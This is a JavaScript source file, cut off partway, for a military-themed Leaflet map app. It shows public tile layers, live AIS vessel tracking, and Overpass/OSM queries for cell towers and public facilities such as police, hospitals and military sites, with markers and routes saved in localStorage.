/* =============================================
   SGP TACTICAL - APP LOGIC v2.0
   REAL-TIME DATA + TRAFFIC SIMULATION
   ============================================= */

(function () {
    'use strict';

    // Initialize global SGP namespace early
    window.SGP = window.SGP || {};

    // =========================================
    // STATE
    // =========================================
    const state = {
        map: null,
        currentTool: 'pan',
        markers: [],
        routes: [],
        zones: [],
        currentRoute: null,
        routePoints: [],
        userPosition: null,
        userMarker: null,
        watchId: null,
        heading: 0,
        panelOpen: null,
        mapLayers: {
            tactical: true,
            satellite: false,
            terrain: false,
            nightvision: false,
            greyops: false,
            streetintel: false,
            hybrid: false,
            watercolor: false,
            maritime: false,
            natgeo: false,
            grid: false,
            traffic: true,
            cellTowers: true,
            infrastructure: true,
            cameras: true,
            aircraft: true,
            vessels: true,
            highwayCams: true
        },
        tileLayers: {},
        markerCounter: 0,
        // Real-time data
        cellTowers: [],
        cellTowerMarkers: [],
        infraMarkers: [],
        infraData: [],
        vehicles: [],
        vehicleLayer: null,
        aisSocket: null,
        aisReconnect: null,
        aisRenderTimer: null,
        aisLayer: L.layerGroup(),
        aisMarkers: new Map(),
        aisVessels: new Map(),
        roads: [],
        cameras: [],
        cameraMarkers: [],
        // Live National Highways CCTV (public snapshot JPEGs, no key needed)
        highwayCams: [],
        highwayCamMarkers: [],
        highwayCamLayer: null,
        cameraCatalog: {},
        activeCamera: null,
        cameraVisionMode: 'nvg',
        cameraZoom: 1.0,
        cameraPtzX: 0,
        cameraPtzY: 0,
        cameraTargetDetect: true,
        cameraRefreshTimer: null,
        cameraAnimFrame: null,
        cameraTileImage: null,
        dataLoading: false,
        lastDataBounds: null,
        animationFrame: null,
        trafficActive: true,
        liveStats: { vehicles: 0, towers: 0, infra: 0, cameras: 0, aircraft: 0, vessels: 0, highwayCams: 0 },
        // Scan zone
        scanZone: null,
        scanZoneRect: null,
        scanCorner1: null,
        scanPreviewRect: null,
        // Aircraft
        aircraftMarkers: [],
        aircraftData: [],
        aircraftRefreshInterval: null,
        // Weather cache
        weatherCache: {},
        // Radio
        radioStations: [],
        radioPlaying: false,
        radioAudio: null,
        currentStation: null,
        // Route planner
        routeConfig: {
            mode: 'foot',       // foot, vehicle, helo, tactical, recon, exfil
            color: '#00b4ff',
            weight: 3,
            style: 'dashed',    // solid, dashed, dotted
            showWaypoints: true,
            showDistance: true,
            showETA: true,
            showElevation: false,
            avoidRoads: false,
            avoidUrban: false,
            dangerZones: false,
            nightOps: false,
            terrain: 'mixed'    // mixed, road, offroad, water, air
        },
        routeDrawing: false,
        routeNavActive: false,
        routeNavIndex: 0,
        routeNavInterval: null,
        routeNavMarker: null,
        routeElevationData: []
    };

    // =========================================
    // DATA PERSISTENCE — LocalStorage
    // =========================================
    function sgpSave(key, data) {
        try { localStorage.setItem('sgp_' + key, JSON.stringify(data)); } catch(e) {}
    }
    function sgpLoad(key, fallback) {
        try {
            const d = localStorage.getItem('sgp_' + key);
            return d ? JSON.parse(d) : fallback;
        } catch(e) { return fallback; }
    }

    function saveAllMarkers() {
        const data = state.markers.map(m => ({ id: m.id, name: m.name, type: m.type, notes: m.notes, lat: m.lat, lng: m.lng }));
        sgpSave('markers', data);
        sgpSave('markerCounter', state.markerCounter);
    }

    function saveAllRoutes() {
        const data = state.routes.map(r => ({ id: r.id, points: r.points, distance: r.distance }));
        sgpSave('routes', data);
    }

    function saveAllZones() {
        const data = state.zones.map(z => ({ id: z.id, points: z.points }));
        sgpSave('zones', data);
    }

    function saveMapView() {
        if (!state.map) return;
        const center = state.map.getCenter();
        sgpSave('mapView', { lat: center.lat, lng: center.lng, zoom: state.map.getZoom() });
    }

    function saveLayerSettings() {
        sgpSave('layers', state.mapLayers);
    }

    function restoreSavedData() {
        // Restore marker counter
        state.markerCounter = sgpLoad('markerCounter', 0);

        // Restore markers
        const savedMarkers = sgpLoad('markers', []);
        savedMarkers.forEach(m => {
            addMarkerToMap(m.lat, m.lng, m.name, m.type, m.notes);
        });

        // Restore routes
        const savedRoutes = sgpLoad('routes', []);
        savedRoutes.forEach(r => {
            if (r.points && r.points.length >= 2) {
                const line = L.polyline(r.points, {
                    color: '#00b4ff', weight: 3, dashArray: '10 6', opacity: 0.8
                }).addTo(state.map);
                const markers = r.points.map(p => {
                    return L.circleMarker(p, {
                        radius: 5, color: '#00b4ff', fillColor: '#00b4ff', fillOpacity: 0.8, weight: 2
                    }).addTo(state.map);
                });
                state.routes.push({ id: r.id, points: r.points, line, markers, distance: r.distance });
            }
        });

        // Restore zones
        const savedZones = sgpLoad('zones', []);
        savedZones.forEach(z => {
            if (z.points && z.points.length >= 3) {
                const polygon = L.polygon(z.points, {
                    color: '#ff2d2d', fillColor: '#ff2d2d', fillOpacity: 0.1, weight: 2, dashArray: '8 4'
                }).addTo(state.map);
                state.zones.push({ id: z.id, points: z.points, polygon });
            }
        });

        // Restore layer settings
        const savedLayers = sgpLoad('layers', null);
        if (savedLayers) {
            Object.assign(state.mapLayers, savedLayers);
        }
        if (state.mapLayers.vessels) {
            startAISStream();
        }
    }

    // =========================================
    // CONSTANTS
    // =========================================
    const OVERPASS_ENDPOINTS = [
        'https://maps.mail.ru/osm/tools/overpass/api/interpreter',
        'https://overpass-api.de/api/interpreter',
        'https://overpass.kumi.systems/api/interpreter'
    ];
    const OVERPASS_TIMEOUT_MS = 10000;
    let currentEndpointIdx = 0;
    const MAX_VEHICLES = 200;
    const VEHICLE_SPEED_FACTOR = 0.00002;
    const DATA_LOAD_DEBOUNCE = 1500;
    const MIN_ZOOM_FOR_DATA = 12;

    const MARKER_TYPES = {
        friendly: { icon: '▲', label: 'FRIENDLY', color: '#00ff41' },
        hostile: { icon: '●', label: 'HOSTILE', color: '#ff2d2d' },
        unknown: { icon: '◆', label: 'UNKNOWN', color: '#ffaa00' },
        neutral: { icon: '■', label: 'NEUTRAL', color: '#4a90d9' },
        objective: { icon: '★', label: 'OBJECTIVE', color: '#ffd700' },
        hazard: { icon: '⚠', label: 'HAZARD', color: '#ff8c00' },
        medevac: { icon: '✚', label: 'MEDEVAC', color: '#ffffff' },
        hq: { icon: '⌂', label: 'HQ / COMMAND', color: '#8a2be2' }
    };

    const ROAD_CONFIG = {
        motorway: { speed: 4, density: 0.15, color: '#ff4444' },
        trunk: { speed: 3.5, density: 0.12, color: '#ff6644' },
        primary: { speed: 2.5, density: 0.10, color: '#ffaa44' },
        secondary: { speed: 2, density: 0.07, color: '#ffdd44' },
        tertiary: { speed: 1.5, density: 0.04, color: '#ffffff' }
    };

    // =========================================
    // BOOT SEQUENCE
    // =========================================
    function bootSequence() {
        const progressBar = document.getElementById('boot-progress-bar');
        const statusEl = document.getElementById('boot-status');
        const bootScreen = document.getElementById('boot-screen');
        const appEl = document.getElementById('app');

        const steps = [
            { progress: 8, msg: 'LOADING SECURITY MODULES...' },
            { progress: 18, msg: 'INITIALIZING MAPPING ENGINE...' },
            { progress: 30, msg: 'CONNECTING GPS SATELLITES...' },
            { progress: 42, msg: 'VERIFYING CREDENTIALS...' },
            { progress: 55, msg: 'LOADING TACTICAL LAYERS...' },
            { progress: 65, msg: 'CONNECTING TO OVERPASS API...' },
            { progress: 75, msg: 'LOADING CELL TOWER DATA...' },
            { progress: 85, msg: 'INITIALIZING TRAFFIC SIMULATION...' },
            { progress: 93, msg: 'SYNCHRONIZING OPERATIONAL DATA...' },
            { progress: 100, msg: 'SYSTEM OPERATIONAL ● ONLINE' }
        ];

        let i = 0;
        const interval = setInterval(() => {
            if (i < steps.length) {
                progressBar.style.width = steps[i].progress + '%';
                statusEl.textContent = steps[i].msg;
                i++;
            } else {
                clearInterval(interval);
                setTimeout(() => {
                    bootScreen.style.opacity = '0';
                    bootScreen.style.transition = 'opacity 0.5s ease';
                    setTimeout(() => {
                        bootScreen.classList.add('hidden');
                        appEl.classList.remove('hidden');
                        initApp();
                    }, 500);
                }, 400);
            }
        }, 300);
    }

    // =========================================
    // INIT APP
    // =========================================
    function initApp() {
        initMap();
        initClock();
        initToolbar();
        initBottomBar();
        initPanelClose();
        initMarkerForm();
        initGeolocation();
        initMobileTools();
        createLiveStatsUI();
        showToast('📡 USE THE SCAN TOOL TO DEFINE YOUR DATA ZONE');

        // Start animation loop (will animate once vehicles exist)
        startTrafficAnimation();

        // Apply saved settings (colors, font size, visibility, etc.)
        if (typeof applyAppSettings === 'function') applyAppSettings();

        // --- Orientation/resize handler: fix map after rotation ---
        let resizeTimer;
        function handleResize() {
            clearTimeout(resizeTimer);
            resizeTimer = setTimeout(function() {
                if (state.map) {
                    state.map.invalidateSize({ animate: false, pan: false });
                }
            }, 250);
        }
        window.addEventListener('resize', handleResize);
        window.addEventListener('orientationchange', function() {
            // orientationchange fires before the resize completes, wait a bit
            setTimeout(handleResize, 400);
        });
        // Also listen for screen.orientation API (modern browsers)
        if (screen.orientation) {
            screen.orientation.addEventListener('change', function() {
                setTimeout(handleResize, 400);
            });
        }
    }

    // =========================================
    // MAP INITIALIZATION
    // =========================================
    function initMap() {
        // Restore saved map position or use default
        const savedView = sgpLoad('mapView', null);
        const center = savedView ? [savedView.lat, savedView.lng] : [40.4168, -3.7038];
        const zoom = savedView ? savedView.zoom : 14;

        state.map = L.map('map', {
            center: center,
            zoom: zoom,
            zoomControl: true,
            attributionControl: true
        });

        state.tileLayers.tactical = L.tileLayer(
            'https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}',
            { attribution: '&copy; Esri', maxNativeZoom: 16, maxZoom: 19, className: 'map-tiles-tactical' }
        );

        state.tileLayers.satellite = L.tileLayer(
            'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}',
            { attribution: '&copy; Esri', maxZoom: 18 }
        );

        state.tileLayers.terrain = L.tileLayer(
            'https://{s}.tile.opentopomap.org/{z}/{x}/{y}.png',
            { attribution: '&copy; OpenTopoMap', maxZoom: 17 }
        );

        state.tileLayers.nightvision = L.tileLayer(
            'https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}',
            { attribution: '&copy; Esri', maxNativeZoom: 16, maxZoom: 19, className: 'map-tiles-nightvision' }
        );

        state.tileLayers.greyops = L.tileLayer(
            'https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Light_Gray_Base/MapServer/tile/{z}/{y}/{x}',
            { attribution: '&copy; Esri', maxNativeZoom: 16, maxZoom: 19 }
        );

        state.tileLayers.streetintel = L.tileLayer(
            'https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/{z}/{y}/{x}',
            { attribution: '&copy; Esri', maxZoom: 19 }
        );

        state.tileLayers.hybrid = L.tileLayer(
            'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}',
            { attribution: '&copy; Esri', maxZoom: 18 }
        );
        // Hybrid = satellite + labels overlay (added after selection)
        state.tileLayers._hybridLabels = L.tileLayer(
            'https://server.arcgisonline.com/ArcGIS/rest/services/Reference/World_Boundaries_and_Places/MapServer/tile/{z}/{y}/{x}',
            { attribution: '', maxNativeZoom: 16, maxZoom: 19, pane: 'overlayPane' }
        );

        state.tileLayers.watercolor = L.tileLayer(
            'https://server.arcgisonline.com/ArcGIS/rest/services/World_Shaded_Relief/MapServer/tile/{z}/{y}/{x}',
            { attribution: '&copy; Esri', maxNativeZoom: 13, maxZoom: 16 }
        );

        state.tileLayers.maritime = L.tileLayer(
            'https://server.arcgisonline.com/ArcGIS/rest/services/Ocean/World_Ocean_Base/MapServer/tile/{z}/{y}/{x}',
            { attribution: '&copy; Esri Ocean', maxZoom: 13 }
        );

        state.tileLayers.natgeo = L.tileLayer(
            'https://server.arcgisonline.com/ArcGIS/rest/services/NatGeo_World_Map/MapServer/tile/{z}/{y}/{x}',
            { attribution: '&copy; Esri/NatGeo', maxZoom: 16 }
        );

        state.tileLayers.tactical.addTo(state.map);

        // Vehicle layer group
        state.vehicleLayer = L.layerGroup().addTo(state.map);
        state.aisLayer = L.layerGroup().addTo(state.map);
        state.highwayCamLayer = L.layerGroup().addTo(state.map);

        // Locate-me control (recentre on the device GPS fix)
        const locateControl = L.control({ position: 'topleft' });
        locateControl.onAdd = function () {
            const btn = L.DomUtil.create('div', 'map-locate-btn');
            btn.innerHTML = '\u25CE';
            btn.title = 'CENTER ON MY POSITION';
            btn.setAttribute('role', 'button');
            btn.setAttribute('aria-label', 'Center map on my position');
            L.DomEvent.disableClickPropagation(btn);
            L.DomEvent.on(btn, 'click', function (e) {
                L.DomEvent.stop(e);
                btn.classList.add('locating');
                setTimeout(function () { btn.classList.remove('locating'); }, 2000);
                locateUser();
            });
            return btn;
        };
        locateControl.addTo(state.map);

        // Layers control - same panel as the CAPAS tool button, but reachable
        // straight from the map.
        const layersControl = L.control({ position: 'topleft' });
        layersControl.onAdd = function () {
            const btn = L.DomUtil.create('div', 'map-locate-btn');
            btn.innerHTML = '\uD83D\uDDC2';
            btn.title = 'LAYERS & LIVE DATA';
            btn.setAttribute('role', 'button');
            btn.setAttribute('aria-label', 'Open layers and live data panel');
            L.DomEvent.disableClickPropagation(btn);
            L.DomEvent.on(btn, 'click', function (e) {
                L.DomEvent.stop(e);
                if (state.panelOpen === 'layers') closePanel(); else openPanel('layers');
            });
            return btn;
        };
        layersControl.addTo(state.map);

        // Map events
        state.map.on('click', onMapClick);
        state.map.on('mousemove', onMapMouseMove);
        state.map.on('moveend', onMapMoveEnd);
        state.map.on('zoomend', onMapZoomEnd);

        // Auto-save map position on move
        state.map.on('moveend', saveMapView);


        document.getElementById('info-zoom').textContent = state.map.getZoom();

        // Restore saved data after map is ready
        setTimeout(() => restoreSavedData(), 500);
    }

    // =========================================
    // OVERPASS API SERVICE
    // =========================================
    // ---------------------------------------------------------------------
    // AIS VESSELS (aisstream.io live stream, needs a free API key)
    // Configure 'aisApiKey' in settings or via localStorage ('sgp_ais_api_key')
    // ---------------------------------------------------------------------
    function getAISApiKey() {
        return (state.appSettings && state.appSettings.aisApiKey) || localStorage.getItem('sgp_ais_api_key') || (window.SGP_CONFIG && window.SGP_CONFIG.aisApiKey) || '';
    }
    const AIS_WS_URL = 'wss://stream.aisstream.io/v0/stream';
    const AIS_MAX_VESSELS = 250;
    const AIS_STALE_MS = 10 * 60 * 1000;
    let aisMoveTimer = null;

    function aisBoundingBoxes() {
        const b = state.scanZone || state.map.getBounds();
        const pad = 0.25;
        const north = Math.min(b.getNorth() + pad, 90);
        const south = Math.max(b.getSouth() - pad, -90);
        const east = Math.min(b.getEast() + pad, 180);
        const west = Math.max(b.getWest() - pad, -180);
        // AISStream expects Top-Left (North, West) and Bottom-Right (South, East)
        return [[[north, west], [south, east]]];
    }

    function startAISStream() {
        const apiKey = getAISApiKey();
        if (!apiKey || state.aisSocket) return;
        if (!state.mapLayers.vessels) return;

        let ws;
        try { ws = new WebSocket(AIS_WS_URL); } catch (e) { return; }
        state.aisSocket = ws;

        ws.onopen = function () {
            ws.send(JSON.stringify({
                APIKey: apiKey,
                BoundingBoxes: aisBoundingBoxes(),
                FilterMessageTypes: ['PositionReport', 'StandardClassBPositionReport', 'ExtendedClassBPositionReport']
            }));
        };

        ws.onmessage = function (ev) {
            let msg;
            try { msg = JSON.parse(ev.data); } catch (e) { return; }
            if (msg.error) {
                console.warn('AISStream error:', msg.error);
                return;
            }

            const posMsgTypes = ['PositionReport', 'StandardClassBPositionReport', 'ExtendedClassBPositionReport'];
            if (!posMsgTypes.includes(msg.MessageType)) return;

            const md = msg.MetaData || {};
            const pr = (msg.Message || {})[msg.MessageType] || {};
            const mmsi = String(md.MMSI || pr.UserID || '');
            if (!mmsi) return;
            if (typeof pr.Latitude !== 'number' || typeof pr.Longitude !== 'number') return;
            if (Math.abs(pr.Latitude) > 90 || Math.abs(pr.Longitude) > 180) return;
            if (pr.Latitude === 0 && pr.Longitude === 0) return;

            const prev = state.aisVessels.get(mmsi);
            const shipName = (md.ShipName || '').trim() || (prev ? prev.name : '');

            state.aisVessels.set(mmsi, {
                mmsi: mmsi,
                name: shipName,
                lat: pr.Latitude,
                lon: pr.Longitude,
                sog: typeof pr.Sog === 'number' ? pr.Sog : 0,
                cog: typeof pr.Cog === 'number' ? pr.Cog : 0,
                heading: typeof pr.TrueHeading === 'number' ? pr.TrueHeading : 0,
                status: pr.NavigationalStatus,
                updated: Date.now()
            });
            scheduleAisRender();
        };

        ws.onclose = function () {
            state.aisSocket = null;
            if (state.mapLayers.vessels && !state.aisReconnect) {
                state.aisReconnect = setTimeout(function () {
                    state.aisReconnect = null;
                    startAISStream();
                }, 10000);
            }
        };

        ws.onerror = function () { try { ws.close(); } catch (e) {} };
    }

    function stopAISStream() {
        if (aisMoveTimer) { clearTimeout(aisMoveTimer); aisMoveTimer = null; }
        if (state.aisReconnect) { clearTimeout(state.aisReconnect); state.aisReconnect = null; }
        if (state.aisSocket) { try { state.aisSocket.close(); } catch (e) {} state.aisSocket = null; }
        if (state.aisRenderTimer) { clearTimeout(state.aisRenderTimer); state.aisRenderTimer = null; }
        if (state.aisLayer) state.aisLayer.clearLayers();
        state.aisVessels.clear();
        state.aisMarkers.clear();
        state.liveStats.vessels = 0;
        updateLiveStats();
    }

    function scheduleAisRender() {
        if (state.aisRenderTimer) return;
        state.aisRenderTimer = setTimeout(function () {
            state.aisRenderTimer = null;
            renderAisVessels();
        }, 1000);
    }

    const AIS_STATUS = { 0: 'UNDER WAY (ENGINE)', 1: 'AT ANCHOR', 2: 'NOT UNDER COMMAND',
        3: 'RESTRICTED MANOEUVRABILITY', 4: 'DRAFT RESTRICTED', 5: 'MOORED', 6: 'AGROUND',
        7: 'FISHING', 8: 'UNDER WAY (SAIL)' };

    function renderAisVessels() {
        if (!state.aisLayer) return;

        const now = Date.now();
        const list = Array.from(state.aisVessels.values())
            .filter(function (v) { return now - v.updated < AIS_STALE_MS; })
            .sort(function (a, b) { return b.updated - a.updated; })
            .slice(0, AIS_MAX_VESSELS);

        const seen = new Set();
        list.forEach(function (v) {
            seen.add(v.mmsi);
            const colour = v.sog > 8 ? '#ff44cc' : (v.sog > 1 ? '#00ffcc' : '#8fa0a8');
            const rot = (v.heading > 0 && v.heading < 360) ? v.heading : ((v.cog >= 0 && v.cog < 360) ? v.cog : 0);
            const icon = L.divIcon({
                className: 'ais-icon',
                html: '<div class="ais-ship" style="color:' + colour + ';transform:rotate(' + rot + 'deg);">\u25B2</div>',
                iconSize: [18, 18],
                iconAnchor: [9, 9]
            });

            let marker = state.aisMarkers.get(v.mmsi);
            if (!marker) {
                marker = L.marker([v.lat, v.lon], { icon: icon });
                marker.addTo(state.aisLayer);
                state.aisMarkers.set(v.mmsi, marker);
            } else {
                marker.setLatLng([v.lat, v.lon]);
                marker.setIcon(icon);
            }
            marker.bindPopup(
                '<div style="font-family:monospace;font-size:11px;min-width:170px;line-height:1.6;">' +
                '<b style="color:#00ffcc;">\u2693 ' + (v.name || 'UNKNOWN SHIP') + '</b><br>' +
                'MMSI: ' + v.mmsi + '<br>' +
                'SPEED: ' + v.sog.toFixed(1) + ' kts &nbsp; COURSE: ' + Math.round(rot) + '\u00b0<br>' +
                (AIS_STATUS[v.status] !== undefined ? 'STATUS: ' + AIS_STATUS[v.status] + '<br>' : '') +
                '<span style="color:#888;font-size:10px;">' + v.lat.toFixed(5) + ', ' + v.lon.toFixed(5) + '</span>' +
                '</div>'
            );
        });

        state.aisMarkers.forEach(function (marker, id) {
            if (!seen.has(id)) {
                state.aisLayer.removeLayer(marker);
                state.aisMarkers.delete(id);
                state.aisVessels.delete(id);
            }
        });

        state.liveStats.vessels = state.aisMarkers.size;
        updateLiveStats();
    }

    // Fetch with a hard deadline. Without this, a host that accepts the
    // connection but never answers (OpenSky when CORS is bypassed, for example)
    // leaves the UI spinner up indefinitely.
    function fetchWithTimeout(url, options, timeoutMs) {
        const controller = new AbortController();
        const timer = setTimeout(function () { controller.abort(); }, timeoutMs || 12000);
        return fetch(url, Object.assign({}, options || {}, { signal: controller.signal }))
            .finally(function () { clearTimeout(timer); });
    }

    // Public Overpass mirrors are routinely rate-limited, blocked or offline
    // (overpass-api.de answers 406, kumi 429, mail.ru intermittently 504), so all
    // endpoints are asked at once and the first usable answer wins. A dead mirror
    // can no longer stall the scan behind a sequential failover.
    function queryOverpass(query) {
        const pending = OVERPASS_ENDPOINTS.map(function (endpoint) {
            const controller = new AbortController();
            const timer = setTimeout(function () { controller.abort(); }, OVERPASS_TIMEOUT_MS);
            return fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json' },
                body: 'data=' + encodeURIComponent(query),
                signal: controller.signal
            }).then(function (response) {
                if (!response.ok) throw new Error('HTTP ' + response.status);
                return response.json();
            }).then(function (data) {
                clearTimeout(timer);
                return data;
            }, function (err) {
                clearTimeout(timer);
                throw err;
            });
        });

        return new Promise(function (resolve) {
            let remaining = pending.length;
            let settled = false;
            pending.forEach(function (attempt) {
                attempt.then(function (data) {
                    if (settled) return;
                    settled = true;
                    resolve(data);
                }, function () {
                    remaining -= 1;
                    if (remaining === 0 && !settled) {
                        settled = true;
                        resolve(null);   // loaders fall back to the OSM API
                    }
                });
            });
        });
    }

    // ---------------------------------------------------------------------
    // OSM API FALLBACK
    // Every public Overpass mirror is intermittently blocked, rate-limited or
    // offline (406 / 429 / 504). When that happens we read the same objects
    // straight from the official OSM map API, which needs no key, and shape
    // them like Overpass output so the loaders below need no special cases.
    // ---------------------------------------------------------------------
    // One in-flight promise per bbox: the four loaders fire concurrently, and
    // without this each would start its own multi-megabyte download.
    let osmFallbackCache = { key: null, promise: null };

    function fetchOsmFallback(bbox) {
        if (osmFallbackCache.key === bbox && osmFallbackCache.promise) return osmFallbackCache.promise;
        const promise = (async function () {

        const b = bbox.split(',').map(parseFloat);   // south,west,north,east
        const url = 'https://api.openstreetmap.org/api/0.6/map?bbox=' +
            [b[1], b[0], b[3], b[2]].join(',');

        const resp = await fetchWithTimeout(url, {}, 45000);
        if (!resp.ok) throw new Error('OSM API HTTP ' + resp.status);

        const doc = new DOMParser().parseFromString(await resp.text(), 'text/xml');
        const elements = [];

        doc.querySelectorAll('node').forEach(function (n) {
            const tags = {};
            n.querySelectorAll('tag').forEach(function (t) { tags[t.getAttribute('k')] = t.getAttribute('v'); });
            elements.push({
                type: 'node',
                id: n.getAttribute('id'),
                lat: parseFloat(n.getAttribute('lat')),
                lon: parseFloat(n.getAttribute('lon')),
                tags: tags
            });
        });

        doc.querySelectorAll('way').forEach(function (w) {
            const tags = {};
            w.querySelectorAll('tag').forEach(function (t) { tags[t.getAttribute('k')] = t.getAttribute('v'); });
            const refs = [];
            w.querySelectorAll('nd').forEach(function (nd) { refs.push(nd.getAttribute('ref')); });
            elements.push({ type: 'way', id: w.getAttribute('id'), nodes: refs, tags: tags });
        });

        return elements;
        })();

        osmFallbackCache = { key: bbox, promise: promise };
        promise.catch(function () { osmFallbackCache = { key: null, promise: null }; });
        return promise;
    }

    async function osmFallbackData(bbox, predicate, withCenter) {
        try {
            const elements = await fetchOsmFallback(bbox);
            const nodeXY = new Map();
            elements.forEach(function (el) { if (el.type === 'node') nodeXY.set(el.id, [el.lat, el.lon]); });

            const out = [];
            elements.forEach(function (el) {
                if (!withCenter) {
                    // Roads: ways reference node ids, so every node must survive
                    // the filter for the geometry to resolve.
                    if (el.type === 'node') { out.push(el); return; }
                    if (predicate(el.tags || {})) out.push(el);
                    return;
                }
                if (!predicate(el.tags || {})) return;
                if (el.type === 'node') { out.push(el); return; }
                const pts = (el.nodes || []).map(function (id) { return nodeXY.get(id); }).filter(Boolean);
                if (!pts.length) return;
                out.push({
                    type: 'way',
                    id: el.id,
                    center: {
                        lat: pts.reduce(function (a, p) { return a + p[0]; }, 0) / pts.length,
                        lon: pts.reduce(function (a, p) { return a + p[1]; }, 0) / pts.length
                    },
                    tags: el.tags
                });
            });
            return { elements: out };
        } catch (e) {
            console.warn('OSM API fallback failed:', e.message);
            return null;
        }
    }

    function getBboxString() {
        if (state.scanZone) {
            const b = state.scanZone;
            return `${b.getSouth()},${b.getWest()},${b.getNorth()},${b.getEast()}`;
        }
        const b = state.map.getBounds();
        return `${b.getSouth()},${b.getWest()},${b.getNorth()},${b.getEast()}`;
    }

    // =========================================
    // LOAD ALL DATA
    // =========================================
    async function loadAllData() {
        if (!state.scanZone) {
            // No scan zone defined — show instructions
            return;
        }

        showDataLoading(true);

        // Clear old data
        clearAllLiveData();

        // AIS is a live socket, not a one-shot query: resubscribe for the new zone.
        if (state.mapLayers.vessels) { stopAISStream(); startAISStream(); }

        try {
            await Promise.all([
                loadCellTowers(),
                loadRoads(),
                loadInfrastructure(),
                loadAircraft(),
                loadCameras(),
                loadHighwayCams()
            ]);
            const loaded = state.liveStats.vehicles + state.liveStats.towers + state.liveStats.infra + state.liveStats.cameras + state.liveStats.aircraft;
            if (loaded === 0) {
                showToast('⚠ NO DATA RETURNED — ZOOM IN OR CHECK NETWORK');
            } else {
                showToast(`✅ DATA LOADED — VEH:${state.liveStats.vehicles} TWR:${state.liveStats.towers} CAM:${state.liveStats.cameras} AIR:${state.liveStats.aircraft}`);
            }
        } catch (e) {
            console.warn('Data loading error:', e);
        }

        showDataLoading(false);
        updateLiveStats();
    }

    function clearAllLiveData() {
        state.cellTowerMarkers.forEach(m => state.map.removeLayer(m));
        state.cellTowerMarkers = [];
        state.cellTowers = [];
        state.infraMarkers.forEach(m => state.map.removeLayer(m));
        state.infraMarkers = [];
        state.infraData = [];
        state.vehicleLayer.clearLayers();
        state.vehicles = [];
        state.roads = [];
        state.aircraftMarkers.forEach(m => state.map.removeLayer(m));
        state.aircraftMarkers = [];
        state.aircraftData = [];
        if (state.aircraftRefreshInterval) { clearInterval(state.aircraftRefreshInterval); state.aircraftRefreshInterval = null; }
        state.cameraMarkers.forEach(m => state.map.removeLayer(m));
        state.cameraMarkers = [];
        state.cameras = [];
        state.liveStats = { vehicles: 0, towers: 0, infra: 0, cameras: 0, aircraft: 0, vessels: 0 };
        updateLiveStats();
    }

    // =========================================
    // CELL TOWERS (REAL DATA)
    // =========================================
    async function loadCellTowers() {
        if (!state.mapLayers.cellTowers) return;

        const bbox = getBboxString();
        const query = `
            [out:json][timeout:25];
            (
                node["man_made"="mast"]["tower:type"="communication"](${bbox});
                node["man_made"="communications_tower"](${bbox});
                node["telecom"="antenna"](${bbox});
                node["man_made"="tower"]["tower:type"="communication"](${bbox});
                node["communication:mobile_phone"="yes"](${bbox});
            );
            out body;
        `;

        let data = await queryOverpass(query);
        if (!data || !data.elements || data.elements.length === 0) {
            // Overpass unavailable - fall back to the official OSM API
            data = await osmFallbackData(bbox, function (tags) { return (tags['man_made'] === 'mast' && tags['tower:type'] === 'communication') || tags['man_made'] === 'communications_tower' || tags['telecom'] === 'antenna' || (tags['man_made'] === 'tower' && tags['tower:type'] === 'communication') || tags['communication:mobile_phone'] === 'yes'; }, true);
            if (!data || !data.elements) return;
        }

        // Clear old tower markers
        state.cellTowerMarkers.forEach(m => state.map.removeLayer(m));
        state.cellTowerMarkers = [];
        state.cellTowers = [];

        data.elements.forEach(el => {
            if (!el.lat || !el.lon) return;

            const operator = el.tags?.operator || el.tags?.['ref:EU:GSMA'] || '';
            const name = el.tags?.name || el.tags?.description || 'Antena';
            const height = el.tags?.height || '';

            const icon = L.divIcon({
                className: 'cell-tower-marker',
                html: `
                    <div class="cell-tower-signal"></div>
                    <div class="cell-tower-icon">📡</div>
                    ${operator ? `<div class="cell-tower-label">${operator.substring(0, 12).toUpperCase()}</div>` : ''}
                `,
                iconSize: [40, 40],
                iconAnchor: [20, 20]
            });

            const marker = L.marker([el.lat, el.lon], { icon })
                .bindPopup(`
                    <div class="popup-title">📡 CELL TOWER</div>
                    <div class="popup-info">
                        <strong>ID:</strong> OSM #${el.id}<br>
                        ${operator ? `<strong>Operator:</strong> ${operator}<br>` : ''}
                        ${name !== 'Antena' ? `<strong>Name:</strong> ${name}<br>` : ''}
                        ${height ? `<strong>Height:</strong> ${height}m<br>` : ''}
                        <strong>Type:</strong> ${el.tags?.['man_made'] || 'tower'}<br>
                    </div>
                    <div class="popup-coords">${formatDMS(el.lat, 'lat')} | ${formatDMS(el.lon, 'lon')}</div>
                `)
                .addTo(state.map);

            state.cellTowerMarkers.push(marker);
            state.cellTowers.push({ lat: el.lat, lon: el.lon, operator, name });
        });

        state.liveStats.towers = state.cellTowers.length;
    }

    // =========================================
    // INFRASTRUCTURE (REAL DATA)
    // =========================================
    async function loadInfrastructure() {
        if (!state.mapLayers.infrastructure) return;

        const bbox = getBboxString();
        const query = `
            [out:json][timeout:25];
            (
                node["amenity"="police"](${bbox});
                way["amenity"="police"](${bbox});
                node["amenity"="hospital"](${bbox});
                way["amenity"="hospital"](${bbox});
                node["amenity"="fire_station"](${bbox});
                way["amenity"="fire_station"](${bbox});
                node["military"](${bbox});
                way["military"](${bbox});
                node["office"="government"](${bbox});
                way["office"="government"](${bbox});
            );
            out center;
        `;

        let data = await queryOverpass(query);
        if (!data || !data.elements || data.elements.length === 0) {
            // Overpass unavailable - fall back to the official OSM API
            data = await osmFallbackData(bbox, function (tags) { return tags['amenity'] === 'police' || tags['amenity'] === 'hospital' || tags['amenity'] === 'fire_station' || !!tags['military'] || tags['office'] === 'government'; }, true);
            if (!data || !data.elements) return;
        }

        // Clear old infra markers
        state.infraMarkers.forEach(m => state.map.removeLayer(m));
        state.infraMarkers = [];
        state.infraData = [];

        data.elements.forEach(el => {
            const lat = el.lat || el.center?.lat;
            const lon = el.lon || el.center?.lon;
            if (!lat || !lon) return;

            let type, emoji, cssClass, label;
            const tags = el.tags || {};
